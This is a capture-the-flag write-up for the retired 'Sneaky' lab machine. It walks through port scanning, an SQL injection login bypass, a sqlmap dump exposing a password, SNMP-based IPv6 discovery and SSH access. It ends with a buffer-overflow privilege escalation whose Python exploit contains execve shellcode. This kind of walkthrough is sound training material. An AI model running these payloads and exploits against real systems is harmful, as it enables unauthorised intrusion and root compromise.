# Sneaky

This is the write-up for the box Sneaky that got retired at the 11th November 2017.
My IP address was 10.10.14.19 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.20    sneaky.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/sneaky.nmap 10.10.10.20
```

```markdown
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Under Development!
```

UDP port scan:
```markdown
nmap -sU -o nmap/sneaky_udp.nmap 10.10.10.20
```

```markdown
PORT    STATE SERVICE
161/udp open  snmp
```

## Checking HTTP (Port 80)

On the web page it says that _"This Page is Under Development"_ and nothing interesting in the source code.
Lets look for hidden paths with **Gobuster**:
```markdown
gobuster -u http://10.10.10.20 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

It finds a _/dev_ folder and when browsing there, it shows a login page with the title _"Member's Area Only - Login Now!"_
When trying out default usernames and passwords, it outputs _"Not Found"_ and by trying out special characters, it outputs _"Internal Server Error"_.
So there is some kind of **SQL injection** flaw to abuse.
```markdown
name=admin&pass=' OR '1'='1
```

Sending this to the server logs us in and greets us with two names and the content of a RSA key file:
- name: admin
- name: thrasivoulos

As we can't use that RSA key yet, lets test the SQL Injection with **Sqlmap**:
```markdown
sqlmap -r sneaky.req -p pass --dbms mysql --level 4 --risk 3 --dump
```

It outputs the passwords of the users that are both the same:
> sup3rstr0ngp4ssf0r4d

There is no service where this can be used for now, so we need to find another way in.

## Checking SNMP (Port 161)

As SNMP is listening on UDP, we can check the _public_ community string:
```markdown
snmpwalk -v2c -c public 10.10.10.20
```

Looking through the results, it outputs that IPv6 is activated which could have SSH open.
To filter for that community string with the IP addresses:
```markdown
snmpwalk -v2c -c public 10.10.10.20 1.3.6.1.2.1.4.34.1.3
```

```markdown
iso.3.6.1.2.1.4.34.1.3.1.4.10.10.10.20 = INTEGER: 2
iso.3.6.1.2.1.4.34.1.3.1.4.10.10.10.255 = INTEGER: 2
iso.3.6.1.2.1.4.34.1.3.1.4.127.0.0.1 = INTEGER: 1
iso.3.6.1.2.1.4.34.1.3.2.16.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.1 = INTEGER: 1
iso.3.6.1.2.1.4.34.1.3.2.16.222.173.190.239.0.0.0.0.2.80.86.255.254.185.197.169 = INTEGER: 2
iso.3.6.1.2.1.4.34.1.3.2.16.254.128.0.0.0.0.0.0.2.80.86.255.254.185.197.169 = INTEGER: 2
```

The IPv6 address is written in decimal and needs to be converted in hexadecimal first.
To make this readable, installing _snmp-mibs-downloader_ and enabling it, will translate all the numbers into human readable strings.
```markdown
de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:b9:b5:c5
fe:80:00:00:00:00:00:00:02:50:56:ff:fe:b9:b5:c5
```

This is how it looks as an IPv6 address:
```markdown
# Unique Local Address
dead:beef:0000:0000:0250:56ff:feb9:b5c5

# Link-Local Address
fe80:0000:0000:0000:0250:56ff:feb9:b5c5
```

With the **Unique Local Address** it is possible to SSH into the box with the SSH key that was found before:
```markdown
chmod 600 thrasivoulos.key

ssh -i thrasivoulos.key thrasivoulos@dead:beef:0000:0000:0250:56ff:feb9:b5c5
```

## Privilege Escalation

After enumerating the box with the user _thrasivoulos_, there is a binary with the **SetUID bit** set called _/usr/local/bin/chal_:
```markdown
find / -perm -4000 2>/dev/null
```

When running the binary, it exits immediately with a _Segmentation fault_, so lets analyze it for **Buffer Overflow vulnerabilities** with **Gdb**:
```markdown
gdb chal
```

Creating an unique pattern as an argument:
```markdown
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 400
```

Running binary in **Gdb** with the pattern as an argument:
```markdown
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
```

It exits at the address _0x316d4130_ that is somewhere in this string. Searching for offset address in the pattern:
```markdown
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x316d4130
```
```markdown
Exact match at offset 362
```

Searching for address of _EIP_:
```markdown
(gdb) r $(python -c 'print "A"*400')

(gdb) x/100x $esp+144
```
```markdown
0xbffff750
```

With all this information, it is possible to write exploit code:
```python
buf_size = 362

# Shellcode from https://packetstormsecurity.com/files/115010/Linux-x86-execve-bin-sh-Shellcode.html
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89"
shellcode += "\xe3\x89\xc1\x89\xc2\xb0\x0b"
shellcode += "\xcd\x80\x31\xc0\x40\xcd\x80"

nop_sled = "\x90"*(buf_size-len(shellcode))
eip = "\x50\xf7\xff\xbf" # 0xbffff750

payload = nop_sled + shellcode + eip

print(payload)
```

Running the binary with the exploit code as an argument:
```markdown
chal $(python exploit.py)
```

It executes the shellcode and starts a shell as root!

